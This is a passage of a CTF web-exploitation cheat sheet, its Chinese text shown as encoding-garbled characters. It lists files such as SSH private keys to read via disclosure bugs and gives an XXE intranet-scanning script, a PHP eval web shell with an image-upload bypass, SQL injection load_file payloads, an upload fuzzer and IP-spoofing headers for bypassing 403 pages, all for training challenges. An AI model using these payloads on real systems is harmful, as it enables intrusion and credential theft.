/proc/self/mem   //è¿›ç¨‹çš„å†…å­˜å†…å®¹ã€‚æ³¨æ„è¯¥æ–‡ä»¶å†…å®¹è¾ƒå¤šè€Œä¸”å­˜åœ¨ä¸å¯è¯»å†™éƒ¨åˆ†ï¼Œç›´æ¥è¯»å–ä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚éœ€è¦ç»“åˆmapsçš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼ã€‚å³æ— æ³•è¯»å–æœªè¢«æ˜ å°„çš„åŒºåŸŸï¼Œåªæœ‰è¯»å–çš„åç§»å€¼æ˜¯è¢«æ˜ å°„çš„åŒºåŸŸæ‰èƒ½æ­£ç¡®è¯»å–å†…å­˜å†…å®¹ã€‚
/proc/self/maps  //å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œé€šè¿‡è¯»è¯¥æ–‡ä»¶çš„å†…å®¹å¯ä»¥å¾—åˆ°å†…å­˜ä»£ç æ®µåŸºå€ã€‚
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/etc/ssh/sshd_config
/var/log/secure
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/syscomfig/network-scripts/ifcfg-eth1
```

44. åŸºç¡€[xxe](../../CTF/BUUCTF/Web/[NCTF2019]Fake%20XML%20cookbook.md)æ¢æµ‹å†…ç½‘ç½‘æ®µè„šæœ¬ã€‚

é¢˜ç›®åŠæ¥æº:[[NCTF2019]True XML cookbook](https://www.cnblogs.com/Article-kelp/p/16026652.html)

```python
import requests as res
url="http://9b0cf961-6439-461e-862f-882833e83736.node4.buuoj.cn:81/doLogin.php"
rawPayload='<?xml version="1.0"?>'\
         '<!DOCTYPE user ['\
         '<!ENTITY payload1 SYSTEM "http://10.244.80.{}">'\
         ']>'\
         '<user>'\
         '<username>'\
         '&payload1;'\
         '</username>'\
         '<password>'\
         '23'\
         '</password>'\
         '</user>'
for i in range(1,256):
    payload=rawPayload.format(i)
    #payload=rawPayload
    print(str("#{} =>").format(i),end='')
    try:
        resp=res.post(url,data=payload,timeout=0.3)
    except:
        continue
    else:
        print(resp.text,end='')
    finally:
        print('')
```

45. php pharååºåˆ—åŒ–æ¼æ´ã€‚ä¾‹é¢˜:[[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox](../../CTF/BUUCTF/Web/[CISCN2019%20ååŒ—èµ›åŒº%20Day1%20Web1]Dropbox.md)
46. phpæ–‡ä»¶ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æœ€åŸºç¡€ç»•è¿‡ã€‚åœ¨æœ¨é©¬çš„å¼€å¤´åŠ ä¸ŠGIF89aï¼Œä¸Šä¼ æ–‡ä»¶æ—¶æŠ“åŒ…æ”¹`Content-Type:`ä¸ºå›¾ç‰‡ã€‚æ³¨æ„æœ¨é©¬æ–‡ä»¶çš„`Content-Type:`æ”¹æˆä»€ä¹ˆéƒ½æ²¡äº‹ï¼Œé‡è¦çš„æ˜¯åç¼€åã€‚å¦‚æœä¸ºäº†ç»•è¿‡è¿‡æ»¤ä¸å¾—ä¸æ”¹åç¼€åï¼Œå°±éœ€è¦åç»­æ‰¾åˆ«çš„æ¼æ´æŠŠåç¼€æ”¹å›æ¥æˆ–è€…ç›´æ¥åŒ…å«æ–‡ä»¶ã€‚

```php
GIF89a

<?php @eval($_POST['shell']);?>
````

åŒ…å¦‚ä¸‹ï¼ˆä»…æˆªå–ä¸Šä¼ éƒ¨åˆ†ï¼‰ï¼š

```
------WebKitFormBoundaryXSmMYBArrqu5ODCM
Content-Disposition: form-data; name="upload_file"; filename="shell.php" //è¿™ä¸ªåå­—å¾ˆé‡è¦ï¼Œä¿ç•™phpåç¼€åå°±èƒ½ç›´æ¥èšå‰‘è¿ï¼Œå¦åˆ™éœ€è¦æ‰¾åˆ«çš„æ¼æ´
Content-Type: image/png //æ”¹æˆpngï¼Œèƒ½ç»•è¿‡è¿‡æ»¤çš„éƒ½è¡Œ

GIF89a

<?php @eval($_POST['shell']);?>

------WebKitFormBoundaryXSmMYBArrqu5ODCM
Content-Disposition: form-data; name="submit"

ä¸Šä¼ 
------WebKitFormBoundaryXSmMYBArrqu5ODCM--
```

47. sqlæ³¨å…¥å¦‚æœæ²¡æœ‰è¿‡æ»¤load_fileï¼Œå°±èƒ½ç›´æ¥è¯»å–æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š

- ',\`address\`=(select(load_file('/flag.txt')))#

å¯ä»¥ç›´æ¥åœ¨ä¸çˆ†è¡¨çˆ†å­—æ®µç­‰ä»»ä½•ä¿¡æ¯çš„æƒ…å†µä¸‹ç›´æ¥è¯»å–åˆ°flag.txtæ–‡ä»¶ã€‚

48.  [linux proc/pid/ä¿¡æ¯è¯´æ˜](https://blog.csdn.net/shenhuxi_yu/article/details/79697792)ã€‚/proc/self/cmdlineå¯ä»¥è¯»å–å½“å‰è¿›ç¨‹æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¦‚æœæ˜¯pythonçš„ç½‘ç«™å¯ä»¥å€Ÿæ­¤è¯»å–åˆ°ç½‘ç«™çš„æ–‡ä»¶åã€‚linuxä¸­å¦‚æœæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä¸”æ²¡æœ‰å…³é—­çš„è¯ï¼Œ`/proc/pid/fd/æ–‡ä»¶æè¿°ç¬¦`  è¿™ä¸ªç›®å½•ä¼šåŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚/proc/pid/fd/3è¯»å–ç¬¬ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ã€‚åœ¨pythoné‡Œä½¿ç”¨openæ‰“å¼€çš„åªè¦ä¸closeï¼Œéƒ½èƒ½çŒœæ–‡ä»¶æè¿°ç¬¦è€Œè¯»å–åˆ°ã€‚ä¾‹é¢˜:[[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown](https://blog.csdn.net/wuyaowangchuan/article/details/114540227)
49. perl GETå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ä¾‹é¢˜:[[HITCON 2017]SSRFme](../../CTF/BUUCTF/Web/[HITCON%202017]SSRFme.md)
50. jwtå¯ä»¥é€šè¿‡å°†algä¿®æ”¹ä¸ºnoneæ¥å®ç°æ— åŠ å¯†ä¼ªé€ ã€‚éœ€è¦ä½¿ç”¨PyJWTç¬¬ä¸‰æ–¹åº“ã€‚ä¾‹é¢˜:[[HFCTF2020]EasyLogin](https://blog.csdn.net/qq_25500649/article/details/118597363)
51. [koaæ¡†æ¶ç»“æ„](https://www.cnblogs.com/wangjiahui/p/12660093.html)ã€‚
52. æ— åˆ—åæ³¨å…¥+å¸ƒå°”ç›²æ³¨ã€‚ä¾‹é¢˜:[[GYCTF2020]Ezsqli](https://blog.csdn.net/qq_45521281/article/details/106647880)(é‡Œé¢æœ€åä¸€é“ä¾‹é¢˜)
53. sqlå¤šè¡ŒäºŒæ¬¡æ³¨å…¥+gitç›®å½•æ³„æ¼+.DS_Storeæ³„éœ²ã€‚ä¾‹é¢˜:[comment](../../CTF/æ”»é˜²ä¸–ç•Œ/7çº§/Web/comment.md)
54. sqlæ³¨å…¥ä¸­ï¼Œç©ºæ ¼èƒ½ç”¨å†…è”æ³¨é‡Šç¬¦`/**/`ä»£æ›¿ï¼›å¦‚æœæ³¨é‡Šç¬¦`#`è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨`;%00`æ›¿ä»£ï¼Œæˆªæ–­æ³¨é‡Šåé¢çš„å†…å®¹ã€‚
55. regexpç›²æ³¨ã€‚ä¾‹é¢˜:[[NCTF2019]SQLi](https://blog.csdn.net/l2872253606/article/details/125265138)
56. [Arjun](https://github.com/s0md3v/Arjun) httpå‚æ•°çˆ†ç ´å·¥å…·ã€‚
57. ä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæœ¨é©¬ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å¹¶è¿æ¥æœ¨é©¬å°±å¯ä»¥getshellã€‚æ¥è‡ª[phpæ–‡ä»¶æ“ä½œtrick](https://www.cnblogs.com/tr1ple/p/11301743.html)ã€‚æ›´å¤šå‚è€ƒ[PHPä¸´æ—¶æ–‡ä»¶æœºåˆ¶](https://www.cnblogs.com/linuxsec/articles/11278477.html)ã€‚ä¾‹é¢˜:[[NPUCTF2020]ezinclude](https://www.cnblogs.com/Article-kelp/p/14826360.html)
58. åœ¨jsonä¸­å¯ä»¥ä½¿ç”¨unicodeç¼–ç è¿›è¡Œè½¬ä¹‰ã€‚å¦‚ä¸‹é¢ä¸¤ç§å†™æ³•éƒ½å¯ä»¥è¢«æ­£ç¡®è§£æã€‚

```
{"poc":"php"}
{"poc":"\u0070\u0068\u0070"}
```

å¯ç”¨äºç»•è¿‡æ»¤ã€‚

59. [file_get_contents("php://input")çš„ç”¨æ³•](https://www.cnblogs.com/jiangxiaobo/p/10723031.html)
60. å­—ç¬¦ç›´æ¥å’Œ0xFFå¼‚æˆ–ç›¸å½“äºå–åã€‚
61. åˆ©ç”¨.htaccessæ–‡ä»¶ä¸Šä¼ æ¼æ´æ—¶ï¼Œæ³¨æ„php_value auto_append_fileçš„è·¯å¾„å¯ä»¥å†™phpä¼ªåè®®ï¼Œè¿™æ ·èƒ½ç”¨äºç»•è¿‡æŸäº›è¿‡æ»¤ã€‚æ¯”å¦‚ç¨‹åºè¿‡æ»¤äº†`<?`ï¼Œæˆ‘ä»¬èƒ½å¤ŸæŠŠé©¬base64ç¼–ç ï¼Œå†ä¸Šä¼ å¸¦æœ‰`php_value auto_append_file "php://filter/convert.base64-decode/resource=xxx`çš„.htaccessæ–‡ä»¶å°±èƒ½æ­£å¸¸ä½¿ç”¨é©¬äº†ã€‚
62. phpç»•è¿‡exif_imagetype()æ£€æµ‹+[open_basedir bypass](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)ã€‚ä¾‹é¢˜:[[SUCTF 2019]EasyWeb](../../CTF/BUUCTF/Web/[SUCTF%202019]EasyWeb.md)
63. render_template_stringå¤„å¯èƒ½ä¼šæœ‰pythonçš„flask sstiã€‚
64. sqlæ³¨å…¥é€—å·è¢«è¿‡æ»¤æ—¶çš„ç»•è¿‡[æ–¹æ³•](https://www.jianshu.com/p/d10785d22db2)ã€‚
65. sqlæ³¨å…¥å¼±ç±»å‹ç›¸åŠ ã€‚ä¾‹é¢˜:[[ç½‘é¼æ¯2018]Unfinish](https://blog.csdn.net/rfrder/article/details/109352385)
66. ç”±ä¸å®‰å…¨çš„SessionIdå¯¼è‡´çš„[ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´](https://paper.seebug.org/1114/)ã€‚ä¾‹é¢˜:[[GYCTF2020]EasyThinking](https://blog.csdn.net/mochu7777777/article/details/105160796)
67. phpä¸­xxx sessionå†…å®¹ä¼šè¢«å­˜å‚¨åˆ°/runtime/session/sess_xxxä¸­ã€‚sessioné»˜è®¤å­˜å‚¨æ–‡ä»¶åæ˜¯sess_+PHPSESSID
68. phpçš„\$_SERVER['QUERY_STRING']ä¸ä¼šå¯¹ä¼ å…¥é”®å€¼å¯¹è¿›è¡Œurlè§£ç ã€‚
69. phpä¸­è™½ç„¶\$_REQUESTåŒæ—¶æ¥æ”¶GETå’ŒPOSTçš„ä¼ å‚ï¼Œä½†POSTæ‹¥æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ï¼Œå½“\$_GETå’Œ\$_POSTä¸­çš„é”®ç›¸åŒæ—¶ï¼Œ\$_POSTçš„å€¼å°†è¦†ç›–\$_GETçš„å€¼ã€‚
70. php sha1åŠ å¯†æ•°ç»„ç»•è¿‡+extractå˜é‡è¦†ç›–æ¼æ´+create_functionä»£ç æ³¨å…¥ã€‚ä¾‹é¢˜:[[BJDCTF2020]EzPHP](../../CTF/BUUCTF/Web/[BJDCTF2020]EzPHP.md)
71. ä»£ç æ‰§è¡Œé¢˜å¯é€šè¿‡è¾“å…¥Error().stackæµ‹è¯•åå°ä»£ç æ˜¯ä¸æ˜¯jsã€‚
72. js [vm2æ²™ç®±é€ƒé€¸](https://www.anquanke.com/post/id/207291)ã€‚ä¾‹é¢˜:[[HFCTF2020]JustEscape](https://blog.csdn.net/SopRomeo/article/details/108629520)
73. webçˆ¬è™«è®¡ç®—è„šæœ¬ã€‚

[ä¾‹é¢˜åŠæ¥æº](https://blog.csdn.net/qq_46263951/article/details/118914287)

```python
import re
import requests
from time import sleep
def count():
    s = requests.session()
    url = 'http://4cf5d9ba-2df8-4b52-88ff-5fcbd27c5fc9.node4.buuoj.cn:81/'
    match = re.compile(r"[0-9]+ [+|-] [0-9]+")
    r = s.get(url)
    for i in range(1001):
        sleep(0.1)
        str = match.findall(r.text)[0]
        # print(eval(str))
        data = {"answer" : eval(str)}
        r = s.post(url, data=data)
        r.encoding = "utf-8"
        # print(r.text)
    print(r.text)
if __name__ == '__main__':
    count()
```

74. postä¸Šä¼ é¢˜ç›®fuzzè„šæœ¬ã€‚

[ä¾‹é¢˜åŠæ¥æº](https://blog.csdn.net/mochu7777777/article/details/107729445),è¿™é¢˜è¿˜æœ‰ä¸ªæ±‰å­—å–ågetshell

```python
# -*- coding:utf-8 -*-
# Author: m0c1nu7
import requests

def ascii_str():
	str_list=[]
	for i in range(33,127):
		str_list.append(chr(i))
	#print('å¯æ˜¾ç¤ºå­—ç¬¦ï¼š%s'%str_list)
	return str_list

def upload_post(url):
	str_list = ascii_str()
	for str in str_list:
		header = {
		'Host':'3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Accept-Encoding':'gzip, deflate',
		'Content-Type':'multipart/form-data; boundary=---------------------------339469688437537919752303518127'
		}
		post = '''-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

12345'''+str+'''
-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="submit"

æäº¤			
-----------------------------339469688437537919752303518127--'''

		res = requests.post(url,data=post.encode('UTF-8'),headers=header)
		if 'Stored' in res.text:
			print("è¯¥å­—ç¬¦å¯ä»¥é€šè¿‡:  {0}".format(str))
		else:
			print("è¿‡æ»¤å­—ç¬¦:  {0}".format(str))
			


if __name__ == '__main__':
	url = 'http://3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn/index.php?act=upload'
	upload_post(url)
```

75. union selectè·¨åº“æŸ¥è¯¢+sqlmapçš„åŸºæœ¬ä½¿ç”¨ã€‚ä¾‹é¢˜:[[b01lers2020]Life on Mars](https://blog.csdn.net/mochu7777777/article/details/107725530)
76. å½“ä¸Šä¼ xmlé‡åˆ°wafæ—¶ï¼Œåœ¨æ²¡æœ‰ä»»ä½•æç¤ºçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°è¯•å°†UTF-8ç¼–ç è½¬ä¸ºUTF-16ç¼–ç ç»•è¿‡ã€‚
- iconv -f utf8 -t utf-16 1.xml > 2.xml
77. ruby ERBæ¨¡æ¿æ³¨å…¥+é¢„å®šä¹‰å˜é‡ã€‚ä¾‹é¢˜:[[SCTF2019]Flag Shop](../../CTF/BUUCTF/Web/[SCTF2019]Flag%20Shop.md)
78. php require_onceç»•è¿‡ã€‚ä¾‹é¢˜:[[WMCTF2020]Make PHP Great Again](https://www.anquanke.com/post/id/213235)
79. å·§ç”¨å‡½æ•°åµŒå¥—ç»•è¿‡æ»¤è¯»æ–‡ä»¶ï¼ˆåˆ©ç”¨scandiré…åˆnextï¼Œcurrentç­‰å‡½æ•°å–å‡ºæ–‡ä»¶åï¼‰ã€‚ä¾‹é¢˜:[[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ](../../CTF/BUUCTF/Web/[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ.md)
80. php finfo_file()å‡½æ•°ä»…è¯†åˆ«PNGæ–‡ä»¶åå…­è¿›åˆ¶ä¸‹çš„ç¬¬ä¸€è¡Œä¿¡æ¯ï¼Œå³æ–‡ä»¶å¤´ä¿¡æ¯ã€‚è€Œgetimagesize()å‡½æ•°åˆ™ä¼šæ£€æµ‹æ›´å¤šä¸œè¥¿ï¼š

```
ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼
ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼
ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 = BMPï¼Œ7 = TIFF(intel byte order)ï¼Œ8 = TIFF(motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM
ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ <image> æ ‡ç­¾
ç´¢å¼• bits ç»™å‡ºçš„æ˜¯å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼
ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3
ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼šheader("Content-type: image/jpeg");
```

ä¾‹é¢˜åŠæ¥æº:[[HarekazeCTF2019]Avatar Uploader 1](https://blog.csdn.net/weixin_44037296/article/details/112604812)

81. phpä½¿ç”¨å†…ç½®ç±»Exception å’Œ Errorç»•è¿‡md5å’Œsha1å‡½æ•°ã€‚ä¾‹é¢˜:[[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp](https://blog.csdn.net/LYJ20010728/article/details/117429054)
82. php [parse_urlè§£ææ¼æ´](https://www.cnblogs.com/tr1ple/p/11137159.html)ã€‚å†ç»™å‡ºä¸€ä¸ªæ¯”è¾ƒç®€çŸ­çš„[å‚è€ƒ](https://blog.csdn.net/q1352483315/article/details/89672426)ã€‚ä¾‹é¢˜:[[N1CTF 2018]eating_cms](https://blog.csdn.net/mochu7777777/article/details/105337682),è¿™é¢˜è¿˜æœ‰ä¸ªæ–‡ä»¶åå‘½ä»¤æ³¨å…¥ã€‚è¯¥é¢˜çš„å…³é”®ç‚¹åœ¨äºä¼ªåè®®è¯»å–æºç ï¼Œä½†å…³é”®æ–‡ä»¶åè¢«è¿‡æ»¤ã€‚urlç»è¿‡parse_urlè¿‡æ»¤ï¼Œæ‰€ä»¥æ„é€ `//user.php?page=php://filter/convert.base64-encode/resource=upllloadddd.php`æ¥ç»•è¿‡è¿‡æ»¤ã€‚æ³¨æ„é¢˜ç›®çš„phpç‰ˆæœ¬æ˜¯5.5.9ï¼Œç°åœ¨7+ç‰ˆæœ¬è¿è¡Œç»“æœä¼šä¸ä¸€æ ·ã€‚

```php
<?php
$url6 = "//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg";
$keywords = ["flag","manage","ffffllllaaaaggg","info"];
$uri=parse_url($url6);
var_dump($uri);
parse_str($uri['query'], $query);
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                echo 'no1';
            if (stristr($v, $token))
                echo 'no2';
        }
    }
'''
7+
array(2) {
  ["host"]=>
  string(8) "user.php"
  ["query"]=>
  string(64) "page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg"
}
no2
'''

'''
5.5.9
array(2) {
  ["host"]=>
  string(17) "user.php?page=php"
  ["path"]=>
  string(55) "//filter/convert.base64-encode/resource=ffffllllaaaaggg"
}
'''
```

å‘ç°7+ç‰ˆæœ¬è§£ææ­£å¸¸ï¼Œè€Œ5.5.9ç‰ˆæœ¬æŠŠurlçš„queryè§£ææˆäº†pathï¼Œè‡ªç„¶å°±èƒ½ç»•è¿‡è¿‡æ»¤äº†ã€‚åŒæ—¶ï¼Œå¤šåŠ ä¸€æ¡æ–œçº¿ä¸ä¼šå½±å“apacheè§£æè·¯å¾„ã€‚

83. sqlmapä½¿ç”¨[å‚è€ƒ](https://www.freebuf.com/sectool/164608.html)ã€‚
84. phpå¼•ç”¨èµ‹å€¼ã€‚ä¾‹é¢˜:[BUU CODE REVIEW 1](https://blog.csdn.net/qq_45555226/article/details/110003144)
85. ä¼ªé€ ipçš„å‡ ç§æ–¹å¼ã€‚

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
X-Client-IP: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Real-ip: 127.0.0.1
X-rewrite-url: secret.php //è¿™ä¸ªæ˜¯bypass 403
```

1.  [ä½¿ç”¨curlå‘é€postè¯·æ±‚](https://blog.csdn.net/m0_37886429/article/details/104399554)ã€‚
2.  [å­˜å‚¨å‹xss](https://www.ddddy.icu/2022/03/31/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/)ã€‚
3.  linuxä¸‹ï¼Œ/proc/self/pwd/ä»£è¡¨å½“å‰è·¯å¾„ã€‚
4.  php sessionååºåˆ—åŒ–æ¼æ´+SoapClient CRLFæ³¨å…¥+SSRFã€‚ä¾‹é¢˜:[bestphp's revenge](../../CTF/BUUCTF/Web/bestphp's%20revenge.md)
5.  call_user_func()å‡½æ•°å¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯arrayç±»å‹çš„è¯ï¼Œä¼šå°†æ•°ç»„çš„æˆå‘˜å½“åšç±»åå’Œæ–¹æ³•ã€‚
6.  jsåŸå‹é“¾æ±¡æŸ“å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œã€‚ä¾‹é¢˜:[[GYCTF2020]Ez_Express](../../CTF/BUUCTF/Web/[GYCTF2020]Ez_Express.md)ã€‚ä¸ä»…ä»…æ˜¯mergeã€cloneå‡½æ•°ä¼šå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ï¼ŒåŒæ ·æ˜¯expresså¸¦æœ‰çš„[undefsafe](https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)å‡½æ•°ä¹Ÿä¼šå¼•å‘æ­¤æ¼æ´ã€‚ä¾‹é¢˜:[[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes](https://blog.csdn.net/qq_45708109/article/details/108233667)
7.  jså¤§å°å†™ç‰¹æ€§
- å¯¹äºtoUpperCase():
> å­—ç¬¦"Ä±"ã€"Å¿" ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º "I"ã€"S"
- å¯¹äºtoLowerCase():
> å­—ç¬¦"â„ª"ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º"k"(è¿™ä¸ªâ„ªä¸æ˜¯K)
1.  åŸºç¡€å­˜å‚¨å‹xssè·å–ç®¡ç†å‘˜cookieã€‚ä¾‹é¢˜:[BUU XSS COURSE 1](https://www.cnblogs.com/rabbittt/p/13372401.html)
2.  sqlå †å æ³¨å…¥+é¢„å¤„ç†è¯­å¥ã€‚ä¾‹é¢˜:[supersqli](../../CTF/æ”»é˜²ä¸–ç•Œ/2çº§/Web/supersqli.md)
3.  [MySQLæ³¨å…¥ åˆ©ç”¨ç³»ç»Ÿè¯»ã€å†™æ–‡ä»¶](https://www.cnblogs.com/mysticbinary/p/14403017.html)
4.  sqlå †å æ³¨å…¥+é¢„å¤„ç†æ³¨å…¥å†™å…¥shell+[charå‡½æ•°](https://blog.csdn.net/asli33/article/details/7090717)ç»•è¿‡è¿‡æ»¤ã€‚ä¾‹é¢˜:[[SUCTF 2018]MultiSQL](https://blog.csdn.net/mochu7777777/article/details/105230001)
5.  [nginxé…ç½®é”™è¯¯å¯¼è‡´çš„ç›®å½•ç©¿è¶Šæ¼æ´](https://blog.csdn.net/haoren_xhf/article/details/107367766)ã€‚
6.  pythonå­˜å‚¨å¯¹è±¡çš„ä½ç½®åœ¨å †ä¸Šï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨/proc/self/maps+/proc/self/memè¯»å–åˆ°SECRET_KEYã€‚ä¾‹é¢˜:[catcat-new](../../CTF/æ”»é˜²ä¸–ç•Œ/2çº§/Web/catcat-new.md)
7.  [.htaccessçš„ä½¿ç”¨æŠ€å·§](https://blog.csdn.net/solitudi/article/details/116666720)
8.   [phpåˆ©ç”¨ä¼ªåè®®ç»•è¿‡exit](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)ã€‚ä¾‹é¢˜:[[EIS 2019]EzPOP](https://blog.csdn.net/TM_1024/article/details/116208390)
9.   phpä¸­ä½¿ç”¨create_function()åˆ›å»ºçš„å‡½æ•°å‘½åè§„å¾‹éµå¾ªï¼š%00lambda_%dï¼Œå…¶ä¸­%dæ˜¯æŒç»­é€’å¢çš„ã€‚ä¾‹é¢˜:[[SUCTF 2018]annonymous](https://blog.csdn.net/mochu7777777/article/details/105225558)
10.  [SSRFæ¼æ´åˆ©ç”¨æ–¹å¼](https://www.anquanke.com/post/id/239994)
11.  thinkphpé»˜è®¤ä¸Šä¼ è·¯å¾„æ˜¯/home/index/upload
12.  phpä¸­ä¸åŒçš„åºåˆ—åŒ–å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚

```
php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼
php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼
php_serialize(php>5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼
```

Ubuntué»˜è®¤å®‰è£…çš„PHPä¸­session.serialize_handleré»˜è®¤è®¾ç½®ä¸ºphpã€‚

105. [åˆ©ç”¨æœ¬åœ°DTDæ–‡ä»¶çš„xxe](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)ã€‚ä¾‹é¢˜:[[GoogleCTF2019 Quals]Bnv](https://syunaht.com/p/1267717976.html)ã€‚
106. [xpathæ³¨å…¥](https://www.cnblogs.com/backlion/p/8554749.html)ã€‚ä¾‹é¢˜:[[NPUCTF2020]ezlogin](https://tyaoo.github.io/2020/05/26/BUUCTF-2/)
107. expressçš„parameterLimité»˜è®¤ä¸º1000;æ ¹æ®rfcï¼Œheaderå­—æ®µå¯ä»¥é€šè¿‡åœ¨æ¯ä¸€è¡Œå‰é¢è‡³å°‘åŠ ä¸€ä¸ªSPæˆ–HTæ¥æ‰©å±•åˆ°å¤šè¡Œã€‚ä¾‹é¢˜:[ez_curl](../../CTF/æ”»é˜²ä¸–ç•Œ/4çº§/Web/ez_curl.md)
108. java WEB-INFç›®å½•æ³„éœ²+ä»»æ„æ–‡ä»¶è¯»å–ã€‚ä¾‹é¢˜:[[RoarCTF 2019]Easy Java]](../../CTF/BUUCTF/Web/[RoarCTF%202019]Easy%20Java.md)
109. è°ƒç”¨shellæ‰§è¡Œä»£ç æ—¶ï¼Œè¢«åå¼•å·æ‰©èµ·æ¥çš„å†…å®¹ä¼šå…ˆæ‰§è¡Œï¼Œä»¥æ­¤å¯ç”¨äºç»•è¿‡ä¸€äº›å›ºå®šçš„æ ¼å¼ã€‚æ¯”å¦‚å†™å…¥çš„systemè¯­å¥ä¼šè¢«åŒ…è£…æˆjsonè¿™ç§æƒ…å†µå°±å¯ç”¨åå¼•å·ç»•è¿‡ã€‚ä¾‹é¢˜:[[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1](https://www.zhaoj.in/read-6397.html)
